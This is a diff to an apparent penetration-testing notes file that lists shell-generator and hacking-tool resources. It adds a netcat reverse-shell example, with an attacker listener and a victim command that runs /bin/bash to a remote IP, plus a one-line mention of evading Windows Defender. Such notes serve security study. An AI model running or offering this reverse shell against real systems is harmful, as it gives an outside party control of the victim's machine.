@@ -3,6 +3,17 @@
 ### Shell Generator Resources(Reverse, Bind, HoaxShell, MSFVenom)
 [Shell Generator](https://www.revshells.com)
 
+**MAC OS Example:**
+
+- Attacker: nc -lvnp 1337
+
+- Victim: nc 192.168.50.53 1337 -e /bin/bash
+
+**Windwos 11 Example:**
+
+- cat & mouse game to bypass defender
+
+
 ### Browser Extensions
 [Hack-Tools Chrome Extension](https://chromewebstore.google.com/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi)
 
